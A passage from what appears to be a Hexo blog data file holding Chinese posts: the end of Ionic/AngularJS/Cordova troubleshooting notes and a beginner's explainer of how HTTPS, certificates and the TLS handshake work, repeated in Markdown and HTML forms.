title=\"上传数据的格式\"></a>上传数据的格式</h3><p>解决了code=1，后台可以接收到请求之后，后台不知道我传过去的数据是什么格式的，我也不知道，因为从浏览器的network里看不到相关信息，cordova-file-transfer文档里也看不到相关介绍。于是后台那边只能看到一张全黑的图片，他们搞了两天，最后终于找到说安装了一个解析包：<code>HttpMultipartParser</code>然后就能正常解析了，并且搞明白了传过去的格式是stream，里面包含了图片数据和uploadOptions里的参数。后台筒子们，我只能帮你们到这了。</p>\n<h3 id=\"on-‘-stateChangeStart’-中使用-state-go会导致无限循环的问题\"><a href=\"#on-‘-stateChangeStart’-中使用-state-go会导致无限循环的问题\" class=\"headerlink\" title=\"$on(‘$stateChangeStart’)中使用$state.go会导致无限循环的问题\"></a>$on(‘$stateChangeStart’)中使用$state.go会导致无限循环的问题</h3><p><a href=\"http://stackoverflow.com/questions/26796945/ui-router-state-go-inside-onstatechangestart-is-cauzing-an-infinite-loop\" target=\"_blank\" rel=\"noopener\">Ui-Router $state.go inside $on(‘$stateChangeStart’) is cauzing an infinite loop</a></p>\n<h3 id=\"npm-install-时的问题\"><a href=\"#npm-install-时的问题\" class=\"headerlink\" title=\"npm install 时的问题\"></a>npm install 时的问题</h3><p><a href=\"https://github.com/vigetlabs/gulp-starter/issues/62\" target=\"_blank\" rel=\"noopener\">unmet dependency but will load</a><br>按照答案中的方法之后会报错：<br><code>&#39;rm&#39; 不是内部或外部命令，也不是可运行的程序 或批处理文件。</code><br>原因：rm是linux中的命令<br>解决方案：<br>使用git bash 打开项目文件夹，<br>rm -rf $HOME/.npm<br>npm cache clean<br>然后再回node shell中使用npm install</p>\n<h3 id=\"npm-install的时候，不能自动安装插件，build出来的APK包plugin丢失，\"><a href=\"#npm-install的时候，不能自动安装插件，build出来的APK包plugin丢失，\" class=\"headerlink\" title=\"npm install的时候，不能自动安装插件，build出来的APK包plugin丢失，\"></a>npm install的时候，不能自动安装插件，build出来的APK包plugin丢失，</h3><p>是因为在安装cordova插件的时候，本应该使用这样的安装命令<code>cordova plugin add XXX --save</code>，但我没有加 <code>--save</code>，这个<code>--save</code>的作用是会自动保存插件的信息到项目根目录下的config.xml，这样在npm install的时候就会根据config.xml文件来自动安装插件</p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><h2 id=\"angular-如何刷新页面\"><a href=\"#angular-如何刷新页面\" class=\"headerlink\" title=\"angular 如何刷新页面\"></a>angular 如何刷新页面</h2><p>需求：多个状态都会跳转到某个state，有一些跳转需要刷新，有一些不需要刷新<br>解决方案：<br>全部需要刷新的时候，就在state里加上<code>cache:false</code>;<br>部分需要刷新的时候，使用$rootScope.$broadcast()，把需要刷新的初始化函数放在 $rootScope.$on的回调函数里</p>\n<h2 id=\"AngularJS定时器\"><a href=\"#AngularJS定时器\" class=\"headerlink\" title=\"AngularJS定时器\"></a>AngularJS定时器</h2><ol>\n<li><a href=\"http://sentsin.com/web/486.html\" target=\"_blank\" rel=\"noopener\">说说Angular中的$timeOut定时器</a></li>\n<li><a href=\"http://www.codesec.net/view/406326.html\" target=\"_blank\" rel=\"noopener\">AngularJS中$interval的用法详解</a></li>\n</ol>\n<h2 id=\"Array的删除splice和for循环合用时的一个小坑\"><a href=\"#Array的删除splice和for循环合用时的一个小坑\" class=\"headerlink\" title=\"Array的删除splice和for循环合用时的一个小坑\"></a>Array的删除splice和for循环合用时的一个小坑</h2><p>Array的删除splice和for循环合用时，由于Array删除一项之后，影响到length和后面项的索引值，所以一定要注意。正确代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var i=0; </span><br><span class=\"line\">for(i; i&lt; arr.length; )&#123; </span><br><span class=\"line\">  if(arr[i].isSelected===true)&#123; </span><br><span class=\"line\">    arr.splice(i,1); </span><br><span class=\"line\">  &#125;else &#123;i++;&#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"http://jerryzou.com/posts/cookie-and-web-storage/\" target=\"_blank\" rel=\"noopener\">详说 Cookie, LocalStorage 与 SessionStorage</a></li>\n<li><a href=\"http://programmers.stackexchange.com/questions/220254/why-is-web-sql-database-deprecated\" target=\"_blank\" rel=\"noopener\">Why is Web SQL database deprecated?</a></li>\n<li><a href=\"https://forum.ionicframework.com/t/ion-content-height-100-is-not-working/28667/2\" target=\"_blank\" rel=\"noopener\">Ion-content height:100% is not working</a></li>\n</ol>"},{"title":"十分钟了解HTTPS","date":"2018-07-10T12:30:00.000Z","toc":true,"comments":1,"_content":"只要十分钟，十分钟你看了不吃亏，十分钟你看了不上当，十分钟就可以让你对HTTPS的话题对酒当歌侃侃而谈，来吧备上花生瓜子八宝粥让我们~~荡起双桨~~ 走起~\n\n阅读本文需要您对HTTP有基本了解，读完大概需要十分钟左右。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://supermaryy.com)\n\n## 一、为什么要用HTTPS——HTTP协议的缺陷\n\n1. 通信使用明文（不加密），内容可能会被窃听\n\n2. 不能验证通信方的身份，所以请求和响应都有可能是攻击者发送的\n\n   数据包在由A到B的过程中，可能经历很多次路由转发，这个过程中数据包可能会被劫持和替换，A和B都无法确定收到的信息是否就是对方发送的。\n\n3. 无法证明报文的完整性，可能是经过篡改的信息。\n\n   同样是在A到B传输过程中，数据包被劫持、篡改之后继续传输，虽然接收方收到的数据包就是发送方发送的那个，但是内容已经遭到篡改，这样无法保证报文的完整性。\n\n## 二、HTTPS是怎么克服这些缺陷的？\n\n### 2.1 HTTPS是什么？\n\n**HTTPS：**在HTTP通信时增加一层TLS通信，以前是HTTP直接和TCP通信，现在HTTP先与TLS通信，再由TLS和TCP进行通信。HTTPS拥有加密、证书校验身份、准确性校验这些功能，避免了HTTP的三个缺陷。\n\n[TLS的前身是SSL](https://en.wikipedia.org/wiki/Transport_Layer_Security)，TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。\n\nHTTP建立通信时，只需要进行TCP三次握手就可以开始传输数据了，而HTTPS在建立通信时，先进行TCP三次握手，再进行TLS握手，然后开始发送数据。\n\n### 2.2 HTTPS的加密功能\n\n**加密技术分为：**\n\n1. 共享密钥加密，也叫对称密钥加密，只有一把密钥，通信方必须先将密钥发送给接收方，然后接收方使用密钥对密文解密，但是密钥发送的过程很难保证安全，一旦密钥被窃取，就不能保证加密的安全了。\n\n2. 公开密钥加密，即非对称密钥加密，有两把密钥，公钥public key 和私钥private key\n\n   公钥是公开的，可以随意发布，任何人都可以获得。A使用B发布的公钥加密报文，B接收后使用自己的私钥进行解密，这样私钥不需要传输，也就不必担心被窃取的风险。\n\n对称加密处理速度要比非对称加密要快，所以在保证安全的基础上，应多使用对称加密方式。**TLS采用非对称加密的加密方式**，**HTTPS采用混合加密机制：**大部分通信使用对称密钥加密，但首次交换共享密钥时是使用非对称加密的方式，这样就既保证了安全，又速度最快。\n\n### 2.3 HTTPS的身份认证功能\n\n按照上文介绍的非对称加密方式，会有一个安全缺陷：客户端怎么知道拿到的公钥是否就是服务端发放的公钥呢，因为在拿到的过程中，公钥有可能被掉包。于是为了避免这个缺陷，引入了证书的概念。\n\n**公钥证书**\n\n为了保证公钥是目标服务器发行的公钥，需要使用权威第三方机构（以下称为CA机构）颁发的**公钥证书**：\n\n- 服务器去CA机构申请证书，机构颁发加数字签名的公钥证书，数字签名可以使用CA机构的公钥来验证；\n- 服务器把公钥证书以公开密钥加密方式传给客户端；\n- 浏览器内会植入常用CA机构的公钥；\n- 客户端从浏览器拿到CA机构的公钥，并用它验证收到的公钥证书的数字签名，验证通过，证明服务器的公钥值得信任，客户端就从公钥证书取出公钥。\n\n总结一下就是服务器传递的公钥上有CA的签名，客户端通过验证签名证实服务器的身份，并安全地得到公钥。\n\nHTTPS首次交换共享密钥使用的是非对称加密方式，这种加密方式会使用公钥证书来验证服务端的身份。而想要验证客户端的身份就不是那么容易了，需要用户去申请证书，而且权威机构的证书是要花钱的，所以客户端身份验证充满挑战。现状是，仅有特殊用途的业务实现了客户端证书，比如那些可支撑客户端证书支出费用的业务，例如银行网银就采用了客户端证书。\n\n### 2.4 HTTPS的完整性校验功能\n\n在HTTPS的通信流程中，应用层发送数据时，会附加一种叫做MAC的报文摘要，MAC能够查知报文是否遭到篡改，从而保护报文的完整性。\n\n## 三、HTTPS建立通信的过程简介\n\nHTTPS首次建立通信时，假设C是客户端client，S是服务器端server，以SSL为例：\n\n1. C/S会先进行TCP三次握手；\n\n2. 然后C发送Client Hello报文及其他SSL信息，表示开始SSL通信过程；\n\n3. S收到后回以Server Hello及其他SSL信息，此外S还发送**公钥证书**，随后发送Server Hello Done通知Client SSL握手协商部分结束\n\n   **即SSL第一次握手结束，这个过程最重要的是S把公钥证书交给了C；**\n\n4. C验证公钥证书有效性，然后取出公钥，然后：\n\n   - 回以Client Key Exchange报文，报文中包含通过**公钥加密过的Pre-master-secret**是一个随机密码串。\n   - C接着发送Change Cipher Spec报文，告诉S此报文后的通信会用Pre-master-secret进行加密。\n   - C发送Finished报文，并包含上述全部报文的整体校验值。这次握手协商能否成功，要看S是否正确解密该报文。\n\n5. S收到加密过的pre-master secret，用自己的私钥得到pre-master secret，然后：\n\n   - 发送Change Cipher Spec报文\n\n   - S发送Finished报文。\n\n6. C/S使用pre-master secret经过一系列步骤生成master secret，使用master secret生成对称密钥session key，之后传输的收据均使用session key加密解密。\n\n至此，**SSL连接建立完成，这个过程最重要的是C把Pre-master-secret用上一步传递的公钥加密后传给S**。之后开始进行HTTP通信，并用共享密钥对通信进行对称加密。\n\n## 四、**HTTPS的问题**\n\n当使用SSL时，它的处理速度变慢：\n\n1. 通信速度变慢，因为除了HTTP请求和响应，还要进行SSL通信，通信量会增加\n2. 因为C/S端都要加密解密，更耗计算资源，SSL加速器可以改善S端问题\n\n建议的是如果非敏感信息使用HTTP通信，只有在包含个人信息等敏感数据时，才利用HTTPS进行通信。特别是访问量较多的网站在加密处理时，会承担较大的负载，可以仅在需要信息隐藏时才加密，以节约资源。但是查看淘宝、京东都是所有请求都采用的HTTPS，也有搜索到一些讲部分页面采用HTTP，部分页面采用HTTPS的部署方法的博文，因为现在我对部署这一块的东西还比较生疏，所以后续有时间再关注。\n\n**默认端口**\n\n1. HTTP默认端口80 \n2. HTTPS默认端口443\n\n### 参考\n\n1. [深入理解HTTPS协议](https://juejin.im/post/5a2fbe1b51882507ae25f991)\n2. 《图解HTTP》\n3. [HTTPS工作原理](https://cattail.me/tech/2015/11/30/how-https-works.html)\n4. [SSL的保密性、真实性、完整性和不可否认性](https://segmentfault.com/q/1010000000192807)\n5. [Nginx部署部分https与部分http](https://blog.csdn.net/na_tion/article/details/17334669)\n\n\n\n","source":"_posts/about-HTTPS.md","raw":"---\ntitle: 十分钟了解HTTPS\ndate: 2018-07-10 20:30:00\ncategories: HTTP #CSS，HTTP，Javascript，NodeJS，框架\ntags: [HTTP2, HTTPS] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n只要十分钟，十分钟你看了不吃亏，十分钟你看了不上当，十分钟就可以让你对HTTPS的话题对酒当歌侃侃而谈，来吧备上花生瓜子八宝粥让我们~~荡起双桨~~ 走起~\n\n阅读本文需要您对HTTP有基本了解，读完大概需要十分钟左右。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://supermaryy.com)\n\n## 一、为什么要用HTTPS——HTTP协议的缺陷\n\n1. 通信使用明文（不加密），内容可能会被窃听\n\n2. 不能验证通信方的身份，所以请求和响应都有可能是攻击者发送的\n\n   数据包在由A到B的过程中，可能经历很多次路由转发，这个过程中数据包可能会被劫持和替换，A和B都无法确定收到的信息是否就是对方发送的。\n\n3. 无法证明报文的完整性，可能是经过篡改的信息。\n\n   同样是在A到B传输过程中，数据包被劫持、篡改之后继续传输，虽然接收方收到的数据包就是发送方发送的那个，但是内容已经遭到篡改，这样无法保证报文的完整性。\n\n## 二、HTTPS是怎么克服这些缺陷的？\n\n### 2.1 HTTPS是什么？\n\n**HTTPS：**在HTTP通信时增加一层TLS通信，以前是HTTP直接和TCP通信，现在HTTP先与TLS通信，再由TLS和TCP进行通信。HTTPS拥有加密、证书校验身份、准确性校验这些功能，避免了HTTP的三个缺陷。\n\n[TLS的前身是SSL](https://en.wikipedia.org/wiki/Transport_Layer_Security)，TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。\n\nHTTP建立通信时，只需要进行TCP三次握手就可以开始传输数据了，而HTTPS在建立通信时，先进行TCP三次握手，再进行TLS握手，然后开始发送数据。\n\n### 2.2 HTTPS的加密功能\n\n**加密技术分为：**\n\n1. 共享密钥加密，也叫对称密钥加密，只有一把密钥，通信方必须先将密钥发送给接收方，然后接收方使用密钥对密文解密，但是密钥发送的过程很难保证安全，一旦密钥被窃取，就不能保证加密的安全了。\n\n2. 公开密钥加密，即非对称密钥加密，有两把密钥，公钥public key 和私钥private key\n\n   公钥是公开的，可以随意发布，任何人都可以获得。A使用B发布的公钥加密报文，B接收后使用自己的私钥进行解密，这样私钥不需要传输，也就不必担心被窃取的风险。\n\n对称加密处理速度要比非对称加密要快，所以在保证安全的基础上，应多使用对称加密方式。**TLS采用非对称加密的加密方式**，**HTTPS采用混合加密机制：**大部分通信使用对称密钥加密，但首次交换共享密钥时是使用非对称加密的方式，这样就既保证了安全，又速度最快。\n\n### 2.3 HTTPS的身份认证功能\n\n按照上文介绍的非对称加密方式，会有一个安全缺陷：客户端怎么知道拿到的公钥是否就是服务端发放的公钥呢，因为在拿到的过程中，公钥有可能被掉包。于是为了避免这个缺陷，引入了证书的概念。\n\n**公钥证书**\n\n为了保证公钥是目标服务器发行的公钥，需要使用权威第三方机构（以下称为CA机构）颁发的**公钥证书**：\n\n- 服务器去CA机构申请证书，机构颁发加数字签名的公钥证书，数字签名可以使用CA机构的公钥来验证；\n- 服务器把公钥证书以公开密钥加密方式传给客户端；\n- 浏览器内会植入常用CA机构的公钥；\n- 客户端从浏览器拿到CA机构的公钥，并用它验证收到的公钥证书的数字签名，验证通过，证明服务器的公钥值得信任，客户端就从公钥证书取出公钥。\n\n总结一下就是服务器传递的公钥上有CA的签名，客户端通过验证签名证实服务器的身份，并安全地得到公钥。\n\nHTTPS首次交换共享密钥使用的是非对称加密方式，这种加密方式会使用公钥证书来验证服务端的身份。而想要验证客户端的身份就不是那么容易了，需要用户去申请证书，而且权威机构的证书是要花钱的，所以客户端身份验证充满挑战。现状是，仅有特殊用途的业务实现了客户端证书，比如那些可支撑客户端证书支出费用的业务，例如银行网银就采用了客户端证书。\n\n### 2.4 HTTPS的完整性校验功能\n\n在HTTPS的通信流程中，应用层发送数据时，会附加一种叫做MAC的报文摘要，MAC能够查知报文是否遭到篡改，从而保护报文的完整性。\n\n## 三、HTTPS建立通信的过程简介\n\nHTTPS首次建立通信时，假设C是客户端client，S是服务器端server，以SSL为例：\n\n1. C/S会先进行TCP三次握手；\n\n2. 然后C发送Client Hello报文及其他SSL信息，表示开始SSL通信过程；\n\n3. S收到后回以Server Hello及其他SSL信息，此外S还发送**公钥证书**，随后发送Server Hello Done通知Client SSL握手协商部分结束\n\n   **即SSL第一次握手结束，这个过程最重要的是S把公钥证书交给了C；**\n\n4. C验证公钥证书有效性，然后取出公钥，然后：\n\n   - 回以Client Key Exchange报文，报文中包含通过**公钥加密过的Pre-master-secret**是一个随机密码串。\n   - C接着发送Change Cipher Spec报文，告诉S此报文后的通信会用Pre-master-secret进行加密。\n   - C发送Finished报文，并包含上述全部报文的整体校验值。这次握手协商能否成功，要看S是否正确解密该报文。\n\n5. S收到加密过的pre-master secret，用自己的私钥得到pre-master secret，然后：\n\n   - 发送Change Cipher Spec报文\n\n   - S发送Finished报文。\n\n6. C/S使用pre-master secret经过一系列步骤生成master secret，使用master secret生成对称密钥session key，之后传输的收据均使用session key加密解密。\n\n至此，**SSL连接建立完成，这个过程最重要的是C把Pre-master-secret用上一步传递的公钥加密后传给S**。之后开始进行HTTP通信，并用共享密钥对通信进行对称加密。\n\n## 四、**HTTPS的问题**\n\n当使用SSL时，它的处理速度变慢：\n\n1. 通信速度变慢，因为除了HTTP请求和响应，还要进行SSL通信，通信量会增加\n2. 因为C/S端都要加密解密，更耗计算资源，SSL加速器可以改善S端问题\n\n建议的是如果非敏感信息使用HTTP通信，只有在包含个人信息等敏感数据时，才利用HTTPS进行通信。特别是访问量较多的网站在加密处理时，会承担较大的负载，可以仅在需要信息隐藏时才加密，以节约资源。但是查看淘宝、京东都是所有请求都采用的HTTPS，也有搜索到一些讲部分页面采用HTTP，部分页面采用HTTPS的部署方法的博文，因为现在我对部署这一块的东西还比较生疏，所以后续有时间再关注。\n\n**默认端口**\n\n1. HTTP默认端口80 \n2. HTTPS默认端口443\n\n### 参考\n\n1. [深入理解HTTPS协议](https://juejin.im/post/5a2fbe1b51882507ae25f991)\n2. 《图解HTTP》\n3. [HTTPS工作原理](https://cattail.me/tech/2015/11/30/how-https-works.html)\n4. [SSL的保密性、真实性、完整性和不可否认性](https://segmentfault.com/q/1010000000192807)\n5. [Nginx部署部分https与部分http](https://blog.csdn.net/na_tion/article/details/17334669)\n\n\n\n","slug":"about-HTTPS","published":1,"updated":"2018-08-16T16:30:30.118Z","_id":"cjkws1pcg0000kzfyt43wk2xv","layout":"post","photos":[],"link":"","content":"<p>只要十分钟，十分钟你看了不吃亏，十分钟你看了不上当，十分钟就可以让你对HTTPS的话题对酒当歌侃侃而谈，来吧备上花生瓜子八宝粥让我们<del>荡起双桨</del> 走起~</p>\n<p>阅读本文需要您对HTTP有基本了解，读完大概需要十分钟左右。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>From  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、为什么要用HTTPS——HTTP协议的缺陷\"><a href=\"#一、为什么要用HTTPS——HTTP协议的缺陷\" class=\"headerlink\" title=\"一、为什么要用HTTPS——HTTP协议的缺陷\"></a>一、为什么要用HTTPS——HTTP协议的缺陷</h2><ol>\n<li><p>通信使用明文（不加密），内容可能会被窃听</p>\n</li>\n<li><p>不能验证通信方的身份，所以请求和响应都有可能是攻击者发送的</p>\n<p>数据包在由A到B的过程中，可能经历很多次路由转发，这个过程中数据包可能会被劫持和替换，A和B都无法确定收到的信息是否就是对方发送的。</p>\n</li>\n<li><p>无法证明报文的完整性，可能是经过篡改的信息。</p>\n<p>同样是在A到B传输过程中，数据包被劫持、篡改之后继续传输，虽然接收方收到的数据包就是发送方发送的那个，但是内容已经遭到篡改，这样无法保证报文的完整性。</p>\n</li>\n</ol>\n<h2 id=\"二、HTTPS是怎么克服这些缺陷的？\"><a href=\"#二、HTTPS是怎么克服这些缺陷的？\" class=\"headerlink\" title=\"二、HTTPS是怎么克服这些缺陷的？\"></a>二、HTTPS是怎么克服这些缺陷的？</h2><h3 id=\"2-1-HTTPS是什么？\"><a href=\"#2-1-HTTPS是什么？\" class=\"headerlink\" title=\"2.1 HTTPS是什么？\"></a>2.1 HTTPS是什么？</h3><p><strong>HTTPS：</strong>在HTTP通信时增加一层TLS通信，以前是HTTP直接和TCP通信，现在HTTP先与TLS通信，再由TLS和TCP进行通信。HTTPS拥有加密、证书校验身份、准确性校验这些功能，避免了HTTP的三个缺陷。</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Transport_Layer_Security\" target=\"_blank\" rel=\"noopener\">TLS的前身是SSL</a>，TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。</p>\n<p>HTTP建立通信时，只需要进行TCP三次握手就可以开始传输数据了，而HTTPS在建立通信时，先进行TCP三次握手，再进行TLS握手，然后开始发送数据。</p>\n<h3 id=\"2-2-HTTPS的加密功能\"><a href=\"#2-2-HTTPS的加密功能\" class=\"headerlink\" title=\"2.2 HTTPS的加密功能\"></a>2.2 HTTPS的加密功能</h3><p><strong>加密技术分为：</strong></p>\n<ol>\n<li><p>共享密钥加密，也叫对称密钥加密，只有一把密钥，通信方必须先将密钥发送给接收方，然后接收方使用密钥对密文解密，但是密钥发送的过程很难保证安全，一旦密钥被窃取，就不能保证加密的安全了。</p>\n</li>\n<li><p>公开密钥加密，即非对称密钥加密，有两把密钥，公钥public key 和私钥private key</p>\n<p>公钥是公开的，可以随意发布，任何人都可以获得。A使用B发布的公钥加密报文，B接收后使用自己的私钥进行解密，这样私钥不需要传输，也就不必担心被窃取的风险。</p>\n</li>\n</ol>\n<p>对称加密处理速度要比非对称加密要快，所以在保证安全的基础上，应多使用对称加密方式。<strong>TLS采用非对称加密的加密方式</strong>，<strong>HTTPS采用混合加密机制：</strong>大部分通信使用对称密钥加密，但首次交换共享密钥时是使用非对称加密的方式，这样就既保证了安全，又速度最快。</p>\n<h3 id=\"2-3-HTTPS的身份认证功能\"><a href=\"#2-3-HTTPS的身份认证功能\" class=\"headerlink\" title=\"2.3 HTTPS的身份认证功能\"></a>2.3 HTTPS的身份认证功能</h3><p>按照上文介绍的非对称加密方式，会有一个安全缺陷：客户端怎么知道拿到的公钥是否就是服务端发放的公钥呢，因为在拿到的过程中，公钥有可能被掉包。于是为了避免这个缺陷，引入了证书的概念。</p>\n<p><strong>公钥证书</strong></p>\n<p>为了保证公钥是目标服务器发行的公钥，需要使用权威第三方机构（以下称为CA机构）颁发的<strong>公钥证书</strong>：</p>\n<ul>\n<li>服务器去CA机构申请证书，机构颁发加数字签名的公钥证书，数字签名可以使用CA机构的公钥来验证；</li>\n<li>服务器把公钥证书以公开密钥加密方式传给客户端；</li>\n<li>浏览器内会植入常用CA机构的公钥；</li>\n<li>客户端从浏览器拿到CA机构的公钥，并用它验证收到的公钥证书的数字签名，验证通过，证明服务器的公钥值得信任，客户端就从公钥证书取出公钥。</li>\n</ul>\n<p>总结一下就是服务器传递的公钥上有CA的签名，客户端通过验证签名证实服务器的身份，并安全地得到公钥。</p>\n<p>HTTPS首次交换共享密钥使用的是非对称加密方式，这种加密方式会使用公钥证书来验证服务端的身份。而想要验证客户端的身份就不是那么容易了，需要用户去申请证书，而且权威机构的证书是要花钱的，所以客户端身份验证充满挑战。现状是，仅有特殊用途的业务实现了客户端证书，比如那些可支撑客户端证书支出费用的业务，例如银行网银就采用了客户端证书。</p>\n<h3 id=\"2-4-HTTPS的完整性校验功能\"><a href=\"#2-4-HTTPS的完整性校验功能\" class=\"headerlink\" title=\"2.4 HTTPS的完整性校验功能\"></a>2.4 HTTPS的完整性校验功能</h3><p>在HTTPS的通信流程中，应用层发送数据时，会附加一种叫做MAC的报文摘要，MAC能够查知报文是否遭到篡改，从而保护报文的完整性。</p>\n<h2 id=\"三、HTTPS建立通信的过程简介\"><a href=\"#三、HTTPS建立通信的过程简介\" class=\"headerlink\" title=\"三、HTTPS建立通信的过程简介\"></a>三、HTTPS建立通信的过程简介</h2><p>HTTPS首次建立通信时，假设C是客户端client，S是服务器端server，以SSL为例：</p>\n<ol>\n<li><p>C/S会先进行TCP三次握手；</p>\n</li>\n<li><p>然后C发送Client Hello报文及其他SSL信息，表示开始SSL通信过程；</p>\n</li>\n<li><p>S收到后回以Server Hello及其他SSL信息，此外S还发送<strong>公钥证书</strong>，随后发送Server Hello Done通知Client SSL握手协商部分结束</p>\n<p><strong>即SSL第一次握手结束，这个过程最重要的是S把公钥证书交给了C；</strong></p>\n</li>\n<li><p>C验证公钥证书有效性，然后取出公钥，然后：</p>\n<ul>\n<li>回以Client Key Exchange报文，报文中包含通过<strong>公钥加密过的Pre-master-secret</strong>是一个随机密码串。</li>\n<li>C接着发送Change Cipher Spec报文，告诉S此报文后的通信会用Pre-master-secret进行加密。</li>\n<li>C发送Finished报文，并包含上述全部报文的整体校验值。这次握手协商能否成功，要看S是否正确解密该报文。</li>\n</ul>\n</li>\n<li><p>S收到加密过的pre-master secret，用自己的私钥得到pre-master secret，然后：</p>\n<ul>\n<li><p>发送Change Cipher Spec报文</p>\n</li>\n<li><p>S发送Finished报文。</p>\n</li>\n</ul>\n</li>\n<li><p>C/S使用pre-master secret经过一系列步骤生成master secret，使用master secret生成对称密钥session key，之后传输的收据均使用session key加密解密。</p>\n</li>\n</ol>\n<p>至此，<strong>SSL连接建立完成，这个过程最重要的是C把Pre-master-secret用上一步传递的公钥加密后传给S</strong>。之后开始进行HTTP通信，并用共享密钥对通信进行对称加密。</p>\n<h2 id=\"四、HTTPS的问题\"><a href=\"#四、HTTPS的问题\" class=\"headerlink\" title=\"四、HTTPS的问题\"></a>四、<strong>HTTPS的问题</strong></h2><p>当使用SSL时，它的处理速度变慢：</p>\n<ol>\n<li>通信速度变慢，因为除了HTTP请求和响应，还要进行SSL通信，通信量会增加</li>\n<li>因为C/S端都要加密解密，更耗计算资源，SSL加速器可以改善S端问题</li>\n</ol>\n<p>建议的是如果非敏感信息使用HTTP通信，只有在包含个人信息等敏感数据时，才利用HTTPS进行通信。特别是访问量较多的网站在加密处理时，会承担较大的负载，可以仅在需要信息隐藏时才加密，以节约资源。但是查看淘宝、京东都是所有请求都采用的HTTPS，也有搜索到一些讲部分页面采用HTTP，部分页面采用HTTPS的部署方法的博文，因为现在我对部署这一块的东西还比较生疏，所以后续有时间再关注。</p>\n<p><strong>默认端口</strong></p>\n<ol>\n<li>HTTP默认端口80 </li>\n<li>HTTPS默认端口443</li>\n</ol>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ol>\n<li><a href=\"https://juejin.im/post/5a2fbe1b51882507ae25f991\" target=\"_blank\" rel=\"noopener\">深入理解HTTPS协议</a></li>\n<li>《图解HTTP》</li>\n<li><a href=\"https://cattail.me/tech/2015/11/30/how-https-works.html\" target=\"_blank\" rel=\"noopener\">HTTPS工作原理</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000000192807\" target=\"_blank\" rel=\"noopener\">SSL的保密性、真实性、完整性和不可否认性</a></li>\n<li><a href=\"https://blog.csdn.net/na_tion/article/details/17334669\" target=\"_blank\" rel=\"noopener\">Nginx部署部分https与部分http</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>只要十分钟，十分钟你看了不吃亏，十分钟你看了不上当，十分钟就可以让你对HTTPS的话题对酒当歌侃侃而谈，来吧备上花生瓜子八宝粥让我们<del>荡起双桨</del> 走起~</p>\n<p>阅读本文需要您对HTTP有基本了解，读完大概需要十分钟左右。</p>","more":"<blockquote>\n<p>From  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、为什么要用HTTPS——HTTP协议的缺陷\"><a href=\"#一、为什么要用HTTPS——HTTP协议的缺陷\" class=\"headerlink\" title=\"一、为什么要用HTTPS——HTTP协议的缺陷\"></a>一、为什么要用HTTPS——HTTP协议的缺陷</h2><ol>\n<li><p>通信使用明文（不加密），内容可能会被窃听</p>\n</li>\n<li><p>不能验证通信方的身份，所以请求和响应都有可能是攻击者发送的</p>\n<p>数据包在由A到B的过程中，可能经历很多次路由转发，这个过程中数据包可能会被劫持和替换，A和B都无法确定收到的信息是否就是对方发送的。</p>\n</li>\n<li><p>无法证明报文的完整性，可能是经过篡改的信息。</p>\n<p>同样是在A到B传输过程中，数据包被劫持、篡改之后继续传输，虽然接收方收到的数据包就是发送方发送的那个，但是内容已经遭到篡改，这样无法保证报文的完整性。</p>\n</li>\n</ol>\n<h2 id=\"二、HTTPS是怎么克服这些缺陷的？\"><a href=\"#二、HTTPS是怎么克服这些缺陷的？\" class=\"headerlink\" title=\"二、HTTPS是怎么克服这些缺陷的？\"></a>二、HTTPS是怎么克服这些缺陷的？</h2><h3 id=\"2-1-HTTPS是什么？\"><a href=\"#2-1-HTTPS是什么？\" class=\"headerlink\" title=\"2.1 HTTPS是什么？\"></a>2.1 HTTPS是什么？</h3><p><strong>HTTPS：</strong>在HTTP通信时增加一层TLS通信，以前是HTTP直接和TCP通信，现在HTTP先与TLS通信，再由TLS和TCP进行通信。HTTPS拥有加密、证书校验身份、准确性校验这些功能，避免了HTTP的三个缺陷。</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Transport_Layer_Security\" target=\"_blank\" rel=\"noopener\">TLS的前身是SSL</a>，TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。</p>\n<p>HTTP建立通信时，只需要进行TCP三次握手就可以开始传输数据了，而HTTPS在建立通信时，先进行TCP三次握手，再进行TLS握手，然后开始发送数据。</p>\n<h3 id=\"2-2-HTTPS的加密功能\"><a href=\"#2-2-HTTPS的加密功能\" class=\"headerlink\" title=\"2.2 HTTPS的加密功能\"></a>2.2 HTTPS的加密功能</h3><p><strong>加密技术分为：</strong></p>\n<ol>\n<li><p>共享密钥加密，也叫对称密钥加密，只有一把密钥，通信方必须先将密钥发送给接收方，然后接收方使用密钥对密文解密，但是密钥发送的过程很难保证安全，一旦密钥被窃取，就不能保证加密的安全了。</p>\n</li>\n<li><p>公开密钥加密，即非对称密钥加密，有两把密钥，公钥public key 和私钥private 